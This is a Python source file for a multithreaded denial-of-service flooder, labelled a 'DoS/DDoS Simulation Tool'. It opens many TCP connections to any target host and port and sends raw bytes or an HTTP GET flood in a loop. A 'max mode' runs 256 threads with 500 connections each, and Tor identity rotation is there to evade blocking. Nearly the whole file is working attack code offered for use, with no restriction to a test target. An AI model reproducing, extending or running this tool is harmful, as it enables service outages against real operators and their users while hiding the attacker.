import socket
import threading
import time
import argparse
import os
import signal
import random
import sys
import json
from datetime import datetime

# ======================= CONFIGURABLE DEFAULTS =======================
DEFAULT_THREADS = 64
DEFAULT_CONNECTIONS = 16
DEFAULT_ATTACK_INTERVAL = 0.2
LOG_FILE = "attack_log.txt"
REPORT_FILE = "report.json"

# ======================= GLOBAL METRICS ==============================
metrics = {
    "packets_sent": 0,
    "connections_made": 0,
    "errors": 0,
    "start_time": time.time(),
}

stop_event = threading.Event()

# ======================= UTILITIES ==================================
def print_dashboard():
    os.system("clear" if os.name == "posix" else "cls")
    elapsed = time.time() - metrics['start_time']
    print("=" * 50)
    print(f"[ LIVE STATS - {datetime.now().strftime('%H:%M:%S')} ]")
    print(f"Packets Sent       : {metrics['packets_sent']}")
    print(f"Connections Made   : {metrics['connections_made']}")
    print(f"Errors Encountered : {metrics['errors']}")
    print(f"Uptime             : {round(elapsed, 2)} seconds")
    print("=" * 50)


def log_to_file(message):
    with open(LOG_FILE, 'a') as f:
        f.write(f"{datetime.now()} - {message}\n")


def save_report():
    with open(REPORT_FILE, 'w') as f:
        json.dump(metrics, f, indent=4)


def tor_newnym():
    try:
        with socket.create_connection(("127.0.0.1", 9051)) as s:
            s.sendall(b'AUTHENTICATE ""\r\n')
            s.sendall(b'SIGNAL NEWNYM\r\n')
            print("[TOR] Identity rotated.")
    except Exception as e:
        print("[TOR] Control error:", e)


def load_payload(file):
    with open(file, 'rb') as f:
        return f.read()


def make_socket(host, port, proxy=None):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((host, port))
        metrics['connections_made'] += 1
        return sock
    except Exception as e:
        metrics['errors'] += 1
        return None


def attack(host, port, payload, args):
    sockets = [None] * args.connections
    while not stop_event.is_set():
        for i in range(args.connections):
            if not sockets[i]:
                sockets[i] = make_socket(host, port)

            try:
                if sockets[i]:
                    sockets[i].send(payload)
                    metrics['packets_sent'] += 1
            except socket.error:
                sockets[i] = None
                metrics['errors'] += 1

        time.sleep(args.interval)

# ======================= MAIN PARSER ================================
parser = argparse.ArgumentParser(description="DoS/DDoS Simulation Tool")
parser.add_argument("host", help="Target hostname or IP")
parser.add_argument("port", type=int, help="Target port")
parser.add_argument("--threads", type=int, default=DEFAULT_THREADS, help="Number of threads")
parser.add_argument("--connections", type=int, default=DEFAULT_CONNECTIONS, help="Connections per thread")
parser.add_argument("--interval", type=float, default=DEFAULT_ATTACK_INTERVAL, help="Delay between sends")
parser.add_argument("--rotate-ip", choices=["vpn", "proxy", "tor"], help="IP rotation method")
parser.add_argument("--tor-control", action="store_true", help="Enable Tor ControlPort rotation")
parser.add_argument("--payload-file", help="Path to payload file")
parser.add_argument("--layer7", action="store_true", help="Enable HTTP flood")
parser.add_argument("--output-log", help="Log output to this file")
parser.add_argument("--report", action="store_true", help="Save report to JSON")
parser.add_argument("--cpu-protect", type=int, help="Throttle when CPU usage exceeds given percent")
parser.add_argument("--max-mode", action="store_true", help="Max packets and threads mode")

args = parser.parse_args()

# ======================= PAYLOAD LOGIC ==============================
if args.output_log:
    LOG_FILE = args.output_log

if args.max_mode:
    args.threads = 256
    args.connections = 500
    args.interval = 0.01

if args.payload_file:
    payload = load_payload(args.payload_file)
elif args.layer7:
    payload = f"GET / HTTP/1.1\r\nHost: {args.host}\r\nUser-Agent: Mozilla\r\nConnection: keep-alive\r\n\r\n".encode()
else:
    payload = b"\x00"

# ======================= LAUNCH ATTACK ==============================
threads = []
try:
    for _ in range(args.threads):
        t = threading.Thread(target=attack, args=(args.host, args.port, payload, args), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.1)

    while True:
        print_dashboard()
        if args.tor_control and args.rotate_ip == "tor":
            tor_newnym()
        time.sleep(2)

except KeyboardInterrupt:
    print("[!] Stopping attack...")
    stop_event.set()
    for t in threads:
        t.join()
    if args.report:
        save_report()
    print("[+] Attack finished. Report saved.")
